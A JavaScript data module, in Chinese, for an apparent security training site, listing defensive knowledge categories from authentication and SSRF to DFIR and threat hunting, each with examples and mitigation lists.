          "配置加固:\n- 禁用不必要功能\n- 移除示例数据库\n- 更新到最新安全补丁\n- 加密敏感数据",
          "监控与审计:\n- 启用审计日志\n- 监控异常访问\n- 实施入侵检测\n- 定期安全评估"
        ],
        difficulty: 'intermediate'
      }
    ],
    protection: [
      '实施强密码策略并使用多因素认证',
      '加密敏感数据，包括传输中和静态数据',
      '限制数据库网络访问，使用防火墙和网络分段',
      '遵循最小权限原则分配用户权限',
      '及时安装安全补丁和更新',
      '定期备份数据和测试恢复流程',
      '启用审计日志并监控可疑活动',
      '实施数据库活动监控(DAM)解决方案',
      '定期进行安全评估和渗透测试',
      '制定数据库安全策略和响应计划'
    ]
  },
  authentication: createKnowledgeCategory({
    title: '认证与会话安全',
    icon: faKey,
    description: '认证与会话安全关注“用户是谁”和“会话是否可信”。学习重点包括登录流程、密码策略、多因素认证、账号恢复、会话生命周期和异常检测。',
    sections: [
      {
        title: '弱口令与凭据填充',
        content: '弱口令、默认账号和泄露凭据复用是认证攻击最常见的入口。授权靶场中应重点观察密码策略、登录失败处理、验证码触发条件和异常登录告警。',
        examples: ['检查是否存在默认账号或演示账号', '观察连续失败登录后的锁定、延迟或验证码策略', '验证登录日志是否包含来源IP、账号、结果和时间'],
        difficulty: 'beginner'
      },
      {
        title: '多因素认证绕过',
        content: 'MFA绕过通常发生在流程状态不一致、备用通道过弱、记住设备逻辑错误或后端接口缺少二次校验时。',
        examples: ['比较登录前后接口是否都校验MFA状态', '检查备用验证码是否有次数、时效和重放限制', '确认敏感操作是否重新验证高可信身份'],
        difficulty: 'intermediate'
      },
      {
        title: '会话固定与Cookie安全',
        content: '会话固定和Cookie配置错误会让攻击者借用或延长他人会话。重点关注登录后会话ID是否轮换、Cookie属性是否完整、退出后服务端会话是否失效。',
        examples: ['登录成功后应重新签发Session ID', 'Cookie建议启用HttpOnly、Secure、SameSite', '退出登录后旧会话ID不应继续访问敏感接口'],
        difficulty: 'intermediate'
      },
      {
        title: '密码重置流程缺陷',
        content: '账号恢复流程经常绕过主登录安全控制。需要验证重置Token随机性、时效、单次使用、账号枚举和通知机制。',
        examples: ['重置Token应与用户、场景和过期时间绑定', '错误提示不应暴露账号是否存在', '修改密码后应撤销旧会话和旧Token'],
        difficulty: 'advanced'
      }
    ],
    protection: ['强密码与泄露凭据检测', '登录失败限速和异常告警', '关键流程强制MFA', '登录后轮换会话ID', 'Cookie启用HttpOnly/Secure/SameSite', '重置Token一次性、短时效、服务端存储校验']
  }),
  'access-control': createKnowledgeCategory({
    title: '访问控制与越权',
    icon: faUserShield,
    description: '访问控制决定“用户能做什么”和“能访问哪些对象”。它比认证更容易被遗漏，尤其是对象级权限、功能级权限和多租户隔离。',
    sections: [
      {
        title: 'IDOR水平越权',
        content: 'IDOR发生在用户可通过修改对象ID访问同级用户资源。学习时应区分对象存在、对象归属和当前用户权限三件事。',
        examples: ['订单、文件、消息、报告等对象接口都需要对象级鉴权', 'ID不可预测不能替代权限校验', '列表接口和详情接口都要校验归属'],
        difficulty: 'beginner'
      },
      {
        title: '垂直越权',
        content: '垂直越权是普通用户访问管理员或高权限功能。常见原因是只隐藏前端入口，后端接口未做角色和能力校验。',
        examples: ['直接访问管理接口应返回403而不是仅靠菜单隐藏', '管理员操作需要服务端校验角色、组织和动作', '权限变更需要审计日志'],
        difficulty: 'intermediate'
      },
      {
        title: '功能级授权缺失',
        content: '功能级授权缺失发生在某类接口只校验登录态、不校验具体动作能力，例如导出、批量删除、审批、邀请成员。',
        examples: ['为每个敏感动作建立权限点', '批量接口逐项校验对象权限', '服务端不要信任前端传入的role或isAdmin字段'],
        difficulty: 'intermediate'
      },
      {
        title: '多租户隔离失败',
        content: 'SaaS和团队系统需要同时校验用户、组织、项目、资源和角色。缺少租户边界会导致跨团队数据泄露。',
        examples: ['所有查询都带租户条件且由服务端上下文生成', '邀请链接、分享链接需要绑定租户和权限', '后台任务也要继承租户隔离规则'],
        difficulty: 'advanced'
      }
    ],
    protection: ['服务端统一授权中间件', '对象级鉴权覆盖读写删导出', '前端隐藏只作为体验优化', '多租户查询强制带租户上下文', '权限变更和越权失败写审计日志', '增加角色矩阵和回归测试']
  }),
  ssrf: createKnowledgeCategory({
    title: '服务端请求伪造',
    icon: faNetworkWired,
    description: 'SSRF利用服务端代请求能力访问攻击者无法直接访问的内部资源。训练重点是识别出站请求点、内网边界、协议限制和云元数据保护。',
    sections: [
      {
        title: '基础SSRF识别',
        content: '图片抓取、Webhook、URL预览、文件导入、代理下载等功能都可能让服务端请求用户提供的URL。',
        examples: ['记录服务端是否会访问用户提交的URL', '使用授权靶场中的回显服务确认请求来源', '区分浏览器请求和服务端请求'],
        difficulty: 'beginner'
      },
      {
        title: '内网资源访问',
        content: '如果出站请求没有限制，服务端可能访问本机、内网管理面板或仅内部可达的服务。',
        examples: ['禁止访问localhost、私有网段和链路本地地址', 'DNS解析后再校验最终IP', '限制端口、协议和重定向链路'],
        difficulty: 'intermediate'
      },
      {
        title: '云元数据保护',
        content: '云环境中的元数据服务可能暴露临时凭证和实例信息。应通过网络策略、IMDSv2或等效机制降低风险。',
        examples: ['阻断到元数据地址的非必要访问', '云凭证使用最小权限和短时效', '监控异常元数据访问'],
        difficulty: 'advanced'
      },
      {
        title: '协议与重定向绕过',
        content: 'SSRF防护常被重定向、DNS重绑定、IPv6、编码地址或非HTTP协议绕过。修复时必须校验最终请求目标。',
        examples: ['只允许http/https且禁止自动跟随不可信重定向', '解析域名后校验每一次连接IP', '维护业务域名白名单而不是黑名单'],
        difficulty: 'advanced'
      }
    ],
    protection: ['默认拒绝任意URL', '使用业务白名单和固定连接器', '解析后校验最终IP和端口', '阻断私有网段、localhost和云元数据地址', '限制重定向和协议', '记录出站请求审计日志']
  }),
  'api-security': createKnowledgeCategory({
    title: 'API安全测试',
    icon: faShieldAlt,
    description: 'API安全覆盖对象级授权、批量操作、数据暴露、速率限制、GraphQL查询复杂度和错误处理。它适合按接口资产清单和风险标签来学习。',
    sections: [
      {
        title: 'BOLA对象级授权',
        content: 'BOLA是API中最常见的授权问题。接口应基于当前用户上下文校验每个对象，而不是只判断对象ID是否存在。',
        examples: ['详情、更新、删除、导出接口都需要对象级权限', '批量接口逐项返回授权结果', '测试账号之间交叉验证对象归属'],
        difficulty: 'beginner'
      },
      {
        title: '批量赋值',
        content: '批量赋值发生在服务端直接把请求体映射到模型，导致用户修改role、balance、ownerId等不该暴露的字段。',
        examples: ['请求体字段使用显式白名单', '敏感字段由服务端计算', 'DTO和数据库模型分离'],
        difficulty: 'intermediate'
      },
      {
        title: 'GraphQL滥用',
        content: 'GraphQL接口需要控制 introspection、查询深度、字段级权限和复杂度，否则可能造成数据过度暴露或资源耗尽。',
        examples: ['生产环境按需关闭或保护introspection', '限制查询深度和复杂度', 'Resolver层执行字段级授权'],
        difficulty: 'advanced'
      },
      {
        title: '速率限制与错误信息',
        content: '登录、验证码、搜索、导出、短信和AI调用等接口都需要配额控制。错误响应不应泄露内部栈、SQL、对象存在性或调试信息。',
        examples: ['按用户、IP、租户和动作组合限速', '错误码稳定但不泄露敏感细节', '高成本接口增加队列和预算限制'],
        difficulty: 'intermediate'
      }
    ],
    protection: ['维护API资产清单', '对象级和功能级授权双重校验', '请求体字段白名单', 'GraphQL复杂度限制', '多维度速率限制', '统一错误响应和审计']
  }),
  deserialization: createKnowledgeCategory({
    title: '反序列化与对象注入',
    icon: faBug,
    description: '不可信反序列化会把外部数据还原成可执行对象图，可能触发危险方法、模板、文件、网络或命令行为。',
    sections: [
      {
        title: 'Java反序列化风险',
        content: 'Java生态中对象流和第三方库组合可能形成危险调用链。学习重点是识别反序列化入口和依赖版本。',
        examples: ['禁止反序列化不可信字节流', '使用JEP 290过滤器或等效白名单', '减少危险库和历史版本依赖'],
        difficulty: 'advanced'
      },
      {
        title: 'PHP对象注入',
        content: 'PHP魔术方法可能在对象还原、销毁或字符串转换时触发副作用。风险常来自cookie、缓存、消息队列或隐藏字段。',
        examples: ['不要对用户输入调用unserialize', '使用JSON等简单数据格式', '限制可反序列化类并校验签名'],
        difficulty: 'advanced'
      },
      {
        title: 'Python Pickle风险',
        content: 'Pickle设计上可表达对象构造逻辑，不适合处理不可信数据。模型、任务队列和缓存场景尤其需要注意。',
        examples: ['外部输入使用JSON、MessagePack安全子集', '模型文件从可信来源加载', '对任务消息进行签名和来源校验'],
        difficulty: 'intermediate'
      },
      {
        title: '签名与版本控制',
        content: '即使必须使用序列化，也要给数据加签、绑定用途、设置版本和过期时间，防止重放和跨场景复用。',
        examples: ['签名覆盖payload、用途、用户和过期时间', '密钥轮换并保留短期兼容窗口', '失败原因不回显内部解析细节'],
        difficulty: 'intermediate'
      }
    ],
    protection: ['不反序列化不可信数据', '优先使用简单数据格式', '可反序列化类型白名单', '签名绑定用途和时效', '升级危险依赖', '对解析失败和异常行为告警']
  }),
  'jwt-oauth': createKnowledgeCategory({
    title: 'JWT与OAuth安全',
    icon: faFingerprint,
    description: 'JWT和OAuth安全关注令牌可信度、签名算法、授权码流程、重定向URI、Scope和生命周期控制。',
    sections: [
      {
        title: 'JWT算法与签名校验',
        content: 'JWT必须固定允许的算法并校验签名、issuer、audience、过期时间和用途。不要让令牌头部决定服务端信任策略。',
        examples: ['服务端固定算法白名单', '校验iss、aud、exp、nbf', '拒绝none算法和未知kid'],
        difficulty: 'intermediate'
      },
      {
        title: '弱密钥与密钥轮换',
        content: 'HMAC弱密钥、密钥泄露和长期不轮换会让令牌失去可信度。密钥管理应接入KMS或专用密钥配置。',
        examples: ['使用高熵密钥或非对称密钥', 'kid只用于选择可信密钥', '轮换时缩短旧令牌有效期'],
        difficulty: 'intermediate'
      },
      {
        title: 'OAuth重定向风险',
        content: 'OAuth授权码流程需要严格校验redirect_uri、state和PKCE。开放重定向会导致授权码或令牌流向错误站点。',
        examples: ['redirect_uri精确匹配而不是前缀匹配', 'state绑定浏览器会话', '公开客户端使用PKCE'],
        difficulty: 'advanced'
      },
      {
        title: 'Scope与Token生命周期',
        content: 'Scope过宽、刷新令牌长期有效、注销不撤销令牌都会扩大影响面。应最小化权限并记录授权事件。',
        examples: ['不同客户端使用不同scope', '刷新令牌轮换和重放检测', '权限变更后撤销相关令牌'],
        difficulty: 'intermediate'
      }
    ],
    protection: ['固定JWT算法和密钥来源', '完整校验标准声明', 'redirect_uri精确白名单', '启用PKCE和state', 'Scope最小化', '刷新令牌轮换和撤销']
  }),
  'cloud-container': createKnowledgeCategory({
    title: '云原生与容器安全',
    icon: faCloud,
    description: '云原生安全覆盖镜像、容器运行时、Kubernetes、IAM、元数据、网络策略和CI/CD供应链。学习时应把环境边界和权限链路画清楚。',
    sections: [
      {
        title: '镜像与密钥泄露',
        content: '镜像层、构建日志、环境变量和仓库历史中常出现凭据。训练重点是识别密钥位置、清理历史和建立扫描流程。',
        examples: ['构建阶段使用secret mount而不是写入镜像层', '镜像发布前扫描密钥和高危依赖', '运行时密钥来自专用Secret管理'],
        difficulty: 'beginner'
      },
      {
        title: '容器运行时隔离',
        content: '危险挂载、特权容器、宿主机命名空间共享和过宽Capabilities都会削弱隔离。',
        examples: ['禁止privileged和宿主机敏感目录挂载', '丢弃不必要Capabilities', '使用只读根文件系统和非root用户'],
        difficulty: 'intermediate'
      },
      {
        title: 'Kubernetes RBAC',
        content: 'Kubernetes风险常来自过宽ServiceAccount、默认Token挂载、Dashboard暴露和集群角色滥用。',
        examples: ['ServiceAccount按工作负载最小授权', '不需要API访问时关闭Token自动挂载', '审计高危动词如create pods/exec/secrets'],
        difficulty: 'advanced'
      },
      {
        title: 'CI/CD供应链',
        content: '流水线拥有发布权限，依赖投毒、脚本篡改、令牌泄露和制品替换都会影响生产环境。',
        examples: ['固定依赖版本并校验锁文件', '流水线令牌短时效和最小权限', '制品签名与部署前校验'],
        difficulty: 'advanced'
      }
    ],
    protection: ['镜像和依赖持续扫描', '容器默认非root和最小Capabilities', 'Kubernetes RBAC最小权限', 'NetworkPolicy限制东西向访问', 'CI/CD密钥隔离和制品签名', '云IAM按工作负载拆分']
  }),
  'cve-reproduction': createKnowledgeCategory({
    title: 'CVE复现与漏洞研究',
    icon: faBug,
    description: 'CVE复现训练关注版本、补丁、配置、触发条件、影响面和修复验证。适合参考Vulhub一类可复现环境，但要保持授权和隔离。',
    sections: [
      {
        title: '环境复现方法',
        content: '复现真实漏洞时，先锁定受影响版本、运行参数、依赖和网络暴露面，避免把环境差异误判为漏洞不存在。',
        examples: ['记录镜像版本、配置文件、端口和依赖', '使用Docker/虚拟机隔离复现环境', '复现后及时清理容器和数据卷'],
        difficulty: 'beginner'
      },
      {
        title: '补丁对比',
        content: '补丁对比能帮助理解根因。重点观察输入校验、权限校验、解析逻辑、依赖升级和默认配置变化。',
        examples: ['比较修复前后关键函数和配置', '把变化归类为校验、鉴权、编码或隔离', '从补丁反推检测点'],
        difficulty: 'advanced'
      },
      {
        title: '影响面评估',
        content: '影响面不只看CVE评分，还要结合资产暴露、前置条件、权限级别、数据敏感性和可检测性。',
        examples: ['列出受影响资产版本', '区分公网、内网、认证后和本地前置条件', '给出临时缓解和永久修复优先级'],
        difficulty: 'intermediate'
      },
      {
        title: '检测规则验证',
        content: '复现环境可以为WAF、IDS、日志规则和资产扫描提供真阳性样本。规则应同时验证误报和漏报。',
        examples: ['记录触发日志字段和网络特征', '使用无害样本验证规则链路', '保留修复后阴性样本用于回归'],
        difficulty: 'advanced'
      }
    ],
    protection: ['复现环境隔离运行', '不连接生产凭证和真实数据', '记录版本与配置', '输出可复现报告', '补丁和临时缓解同时验证', '检测规则保留正负样本']
  }),
  'linux-wargame': createKnowledgeCategory({
    title: 'Linux与CTF基础',
    icon: faLock,
    description: 'Linux与CTF基础参考关卡式靶场的学习方式，先训练Shell、文件、权限、编码、网络和笔记习惯，再进入复杂漏洞。',
    sections: [
      {
        title: 'Shell与文件导航',
        content: '初学者应熟悉pwd、ls、cd、cat、less、find、grep等基础命令，理解路径、隐藏文件和命令帮助。',
        examples: ['使用man和--help补全未知参数', '用find定位文件类型和权限', '把每关用到的命令写成笔记'],
        difficulty: 'beginner'
      },
      {
        title: '权限与用户上下文',
        content: 'CTF关卡常通过文件权限、属主、SUID、环境变量和进程上下文训练最小权限理解。',
        examples: ['用id、ls -l、stat观察权限', '区分读、写、执行对文件和目录的含义', '避免在真实系统尝试提权技巧'],
        difficulty: 'beginner'
      },
      {
        title: '管道、重定向与文本处理',
        content: '管道思维能把复杂任务拆成多个小命令，适合处理日志、编码、字典和输出过滤。',
        examples: ['grep、sort、uniq、cut、awk组合分析文本', '使用重定向保存中间结果', '逐步验证每个管道阶段输出'],
        difficulty: 'intermediate'
      },
      {
        title: '关卡式笔记法',
        content: '学习型靶场的核心不是收集flag，而是沉淀方法。每关记录目标、线索、命令、失败尝试和复盘。',
        examples: ['记录“为什么尝试这个命令”', '把失败路径也写入笔记', '用标签标注编码、权限、网络、Web等知识点'],
        difficulty: 'beginner'
      }
    ],
    protection: ['仅在授权靶场练习', '命令执行前确认目标路径', '保留学习笔记和复盘', '优先理解原理而不是复制答案', '使用隔离用户和临时环境', '避免把CTF技巧直接迁移到生产系统']
  }),
  cryptography: createKnowledgeCategory({
    title: '密码学与编码',
    icon: faKey,
    description: '密码学与编码训练帮助学习者区分编码、哈希、加密、签名和密钥管理。CTF中常见短题适合作为入门阶梯。',
    sections: [
      {
        title: '编码与表示',
        content: 'Base64、URL编码、Hex、Unicode等只是表示方式，不提供保密性。学习时先判断数据是编码、压缩、序列化还是加密。',
        examples: ['观察字符集和长度判断可能的编码', '多层编码逐层还原并记录顺序', '不要把Base64当作加密方案'],
        difficulty: 'beginner'
      },
      {
        title: '哈希与口令存储',
        content: '哈希不可逆但可被字典和暴力猜测。安全口令存储需要盐、慢哈希和合理参数。',
        examples: ['识别MD5、SHA1、bcrypt、Argon2等格式差异', '每个用户使用独立随机盐', '密码重置不应发送原密码'],
        difficulty: 'beginner'
      },
      {
        title: '对称与非对称加密',
        content: '对称加密依赖共享密钥，非对称加密依赖密钥对。常见错误包括固定IV、错误模式、密钥硬编码和缺少认证。',
        examples: ['优先使用AEAD模式如GCM或ChaCha20-Poly1305', 'IV/nonce不可重复', '密钥放入KMS或Secret管理'],
        difficulty: 'intermediate'
      },
      {
        title: '签名、证书与随机数',
        content: '签名验证身份和完整性，证书绑定公钥和主体。随机数不足会破坏Token、验证码、密钥和签名安全。',
        examples: ['使用密码学安全随机数生成Token', '证书校验不要关闭hostname验证', '签名验证失败必须拒绝请求'],
        difficulty: 'advanced'
      }
    ],
    protection: ['区分编码、哈希和加密', '口令使用Argon2/bcrypt/PBKDF2和独立盐', '使用成熟密码库', '密钥不硬编码', '启用认证加密', 'Token使用安全随机数和短时效']
  }),
  'binary-reversing': createKnowledgeCategory({
    title: '逆向与二进制基础',
    icon: faCodeBranch,
    description: '逆向与二进制基础面向CTF、漏洞研究和安全审计，强调文件格式、静态分析、动态调试、内存模型和安全编译选项。',
    sections: [
      {
        title: '文件格式与程序入口',
        content: '理解ELF、PE、Mach-O的入口点、节区、导入表和符号信息，有助于定位程序逻辑和依赖。',
        examples: ['用file、strings、readelf/objdump观察基础信息', '记录架构、位数、动态/静态链接', '先找输入点和错误信息'],
        difficulty: 'beginner'
      },
      {
        title: '静态分析',
        content: '静态分析不运行程序，适合阅读控制流、字符串引用、函数关系和可疑逻辑。',
        examples: ['从字符串交叉引用回溯逻辑', '把复杂函数拆成输入、处理、输出', '标注危险API和边界检查'],
        difficulty: 'intermediate'
      },
      {
        title: '动态调试',
        content: '动态调试通过断点、单步、寄存器和内存观察验证假设。靶场中应记录触发条件而不是只记录结果。',
        examples: ['在输入读取和比较位置下断点', '观察寄存器、栈和关键缓冲区', '每次修改输入只验证一个假设'],
        difficulty: 'advanced'
      },
      {
        title: '内存保护与安全编译',
        content: '现代系统通过ASLR、NX、Canary、PIE、RELRO等机制降低利用稳定性。学习时应先识别保护状态。',
        examples: ['检查二进制保护选项', '理解越界、格式化字符串和整数问题的根因', '修复时增加边界检查和安全编译参数'],
        difficulty: 'advanced'
      }
    ],
    protection: ['启用编译器安全选项', '避免危险字符串函数', '输入长度和边界统一校验', '模糊测试关键解析器', '依赖库及时更新', '崩溃样本纳入回归测试']
  }),
  forensics: createKnowledgeCategory({
    title: '取证与流量分析',
    icon: faArchive,
    description: '取证与流量分析帮助学习者从文件、日志、PCAP、内存和系统痕迹中还原事件。蓝队学习应强调证据链和时间线。',
    sections: [
      {
        title: '文件元数据分析',
        content: '文件时间戳、EXIF、文档属性、哈希和魔术字节可帮助判断来源、修改痕迹和类型伪装。',
        examples: ['计算哈希并记录样本来源', '比较扩展名和真实文件类型', '提取文档元数据但避免打开不可信宏'],
        difficulty: 'beginner'
      },
      {
        title: 'PCAP流量分析',
        content: 'PCAP分析关注会话、协议、DNS、HTTP、TLS元数据和异常数据流。训练目标是从网络证据构建事件链。',
        examples: ['按时间、会话和协议分层查看', '提取域名、IP、User-Agent和文件哈希', '标注可疑连接的前后因果'],
        difficulty: 'intermediate'
      },
      {
        title: '日志时间线',
        content: '时间线把分散证据串起来，适合定位初始访问、横向移动、权限变化和数据访问。',
        examples: ['统一时区和时间格式', '把认证、进程、网络、云审计放在同一时间轴', '区分事实、推断和待验证问题'],
        difficulty: 'intermediate'
      },
      {
        title: 'IOC提取与报告',
        content: 'IOC包括IP、域名、URL、哈希、文件路径、注册表、命令行等。报告应说明证据来源、置信度和处置建议。',
        examples: ['每个IOC标注来源日志和时间', '区分高置信和低置信指标', '报告包含影响范围、根因和建议动作'],
        difficulty: 'advanced'
      }
    ],
    protection: ['保留原始证据和哈希', '统一时间线和时区', '避免污染样本', 'IOC标注来源和置信度', '报告区分事实与推断', '把检测缺口转化为规则或监控需求']
  }),
  'blue-team-dfir': createKnowledgeCategory({
    title: '蓝队调查与DFIR',
    icon: faUserSecret,
    description: '蓝队DFIR按真实SOC工作流组织学习：告警分诊、证据收集、时间线、影响评估、遏制恢复和复盘。',
    sections: [
      {
        title: '告警分诊',
        content: '分诊要判断告警是否真实、是否紧急、影响哪些资产以及下一步需要哪些证据。',
        examples: ['记录告警来源、规则名、资产、用户和时间', '先确认资产重要性和暴露面', '避免只凭单条告警下结论'],
        difficulty: 'beginner'
      },
      {
        title: '证据收集',
        content: '证据收集应覆盖身份、主机、网络、云审计和应用日志，并保持链路完整。',
        examples: ['按问题列证据清单', '先采集易失性证据', '为每份证据记录来源和时间范围'],
        difficulty: 'intermediate'
      },
      {
        title: '遏制与恢复',
        content: '遏制动作需要权衡业务影响和攻击扩散风险。恢复后要确认根因关闭，避免攻击者再次进入。',
        examples: ['隔离主机前保存关键证据', '撤销可疑Token和凭据', '恢复后验证补丁、配置和账号状态'],
        difficulty: 'advanced'
      },
      {
        title: '复盘与改进',
        content: '复盘把一次事件转化为检测规则、加固项、演练脚本和流程改进。',
        examples: ['总结漏报点和误报点', '把调查查询固化为检测规则', '形成时间线、根因、影响和行动项'],
        difficulty: 'intermediate'
      }
    ],
    protection: ['告警分级和SLA', '证据链记录', '身份和终端日志集中化', '事件响应剧本', '恢复后根因验证', '检测规则持续调优']
  }),
  'threat-hunting': createKnowledgeCategory({
    title: '威胁狩猎与检测工程',
    icon: faSearch,
    description: '威胁狩猎不是等待告警，而是基于假设主动查询异常行为。检测工程则把可重复发现转化为稳定规则和可运维告警。',
    sections: [
      {
        title: '狩猎假设',
        content: '一个好的狩猎假设应说明攻击行为、可能证据、数据源和成功/失败判定。',
        examples: ['假设格式: 如果发生X，应在Y数据源看到Z行为', '先选高价值资产和常见TTP', '限制时间范围减少噪声'],
        difficulty: 'beginner'
      },
      {
        title: 'KQL/Sigma/YARA基础',
        content: '查询和规则语言用于表达检测逻辑。学习重点是字段理解、过滤条件、聚合、时间窗口和规则可迁移性。',
        examples: ['KQL适合日志查询和聚合', 'Sigma适合跨平台日志规则表达', 'YARA适合样本和文件特征匹配'],
        difficulty: 'intermediate'
      },
      {
        title: 'TTP与ATT&CK映射',
        content: '映射到ATT&CK能帮助描述攻击阶段、覆盖缺口和检测目标，但不能替代具体数据验证。',
        examples: ['把检测规则标注技术ID和数据源', '记录覆盖的是行为、工具还是IOC', '优先检测稳定行为而不是短期指标'],
        difficulty: 'intermediate'
      },
      {
        title: '误报调优',
        content: '检测规则需要可运行。调优时要保留攻击可见性，同时减少业务正常行为造成的噪声。',
        examples: ['用白名单解释而不是简单排除全部异常', '记录每次调优理由和样本', '规则上线后观察触发量和处置结果'],
        difficulty: 'advanced'
      }
    ],
    protection: ['建立数据源覆盖表', '假设驱动狩猎', '规则版本化和评审', 'ATT&CK映射', '误报样本库', '检测效果用触发量、准确率和响应动作衡量']
  })
};


export default knowledgeData;
